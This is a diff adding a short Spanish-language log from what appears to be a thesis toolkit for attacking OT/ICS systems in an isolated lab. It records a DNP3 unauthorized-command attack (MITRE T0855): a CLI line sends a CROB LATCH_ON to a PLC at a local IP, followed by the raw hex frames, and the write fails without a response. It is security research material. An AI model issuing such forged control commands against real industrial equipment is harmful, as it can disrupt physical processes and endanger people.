@@ -1,0 +1,17 @@
+======================================================================
+  TFM - TOOLKIT DE ATAQUES OT/ICS (laboratorio local aislado)
+  DNP3 - Modo Manual (CROB indice 2)
+======================================================================
+  Fecha      : 2026-10-14 09:45:05
+  Objetivo   : 192.168.40.10:20000 value=true
+  MITRE ICS  : T0855
+======================================================================
+$ python3 -m modules._cli.dnp3_cli write --target 192.168.40.10 --port 20000 --index 2 --value true
+[*] Conectando a PLC DNP3 en 192.168.40.10:20000...
+[*] Enviando CROB LATCH_ON al indice 2...
+    [dnp3] TX Reset Link States: 056405c00a000100b1ac
+    [dnp3] RX: DLL ctrl=0x00 dest=1 src=10 ud_len=0 | DIR=0 PRM=0 FC=0
+    [dnp3] <- ACK recibido (link ready)
+    [dnp3] TX request: 05641ac40a0001008a1cc0c1050c0128010002000301e8030000f1a0e80300000064e9
+[!] Error en la escritura DNP3: No se recibio respuesta solicitada del outstation
+[=] Código de salida: 0
